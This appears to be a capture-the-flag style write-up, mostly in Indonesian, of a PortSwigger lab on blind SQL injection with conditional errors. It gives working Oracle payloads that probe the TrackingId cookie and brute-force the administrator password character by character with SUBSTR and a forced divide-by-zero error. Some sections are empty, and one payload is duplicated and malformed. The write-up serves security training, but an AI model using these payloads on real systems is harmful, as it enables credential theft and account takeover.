# 📝 Lab: Blind SQL injection with conditional errors

- **Vulnerability:** SQL Injection
- **Difficulty:** PRACTITIONER
- **Objective:** Log in as the `administrator` user.
> **Description:** This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message. The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user.

---

## 🛠️ Tools Used

- Browser (FoxyProxy)
- Burp Suite
- Python

---

## 🐾 Steps to Reproduce

1. Open the lab homepage and intercept the request using **Burp Suite**.
2. Go to **Proxy → HTTP History**, right-click the request, and send it to **Repeater** (`Ctrl + R`).
3. `TrackingId` adalah parameter yang menjadi target kita. Injeksi dengan payload `'||(SELECT '')||'` jika respon **200 OK** maka bukan *OracleSQL* jika **500** payload yang di gunakan `'||(SELECT '' FROM dual)||'`.
4. Setelah mengetahui bahwa server menggunakan *OracleSQL* kita bisa mengecek server tersebut error karena rentan atau bukan dengan cara injeksi payload `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' END FROM DUAL)||` atau `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR (1/0) ELSE '' END FROM DUAL)||` penjelasan ada di bagian **PAYLOAD**.
5. Setelah mengetahui bahwa error berasal dari kerentana (karena sudah di kasih tau juga nama table dan kolom) kita bisa langsung injeksi dengan payload `'||(SELECT CASE WHEN SUBSTR(password, 1, 1)='a' THEN TO_CHAR (1/0) ELSE '' END FROM users WHERE username='administrator')||'`.
6. Di karena kan kita harus menebak lagi, kita bisa gunakan teknik **Bruteforce** untuk mengetahui password sang admin. Kita bisa menggunakan *Burp Intruder* atau tools yang kita buat sendiri.
7. Kita akan pake tools sendiri, caranya:
- Jalankan tools
- Masukan URL: `https://(YOUR-ID).web-security-academy.net/`
- Masukan Cookie_payload: `(YOUR-COOKIE)'||(SELECT CASE WHEN SUBSTR(password, {i}, 1)='{char}' THEN TO_CHAR (1/0) ELSE '' END FROM users WHERE username='administrator')||'`
8. Setelah menunggu password akan muncul. Login dengan krediensial admin dan BOOMM!! kamu sudah login menggunakan akun admnin!
9. Selesai. Banner **LAB SOLVE** akan muncul.
---

## 🎯 Impact

---

## 💣 Payload

---

## 🔗 Reference

For more SQL injection payloads and database-specific syntax, check out the **[PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)** 
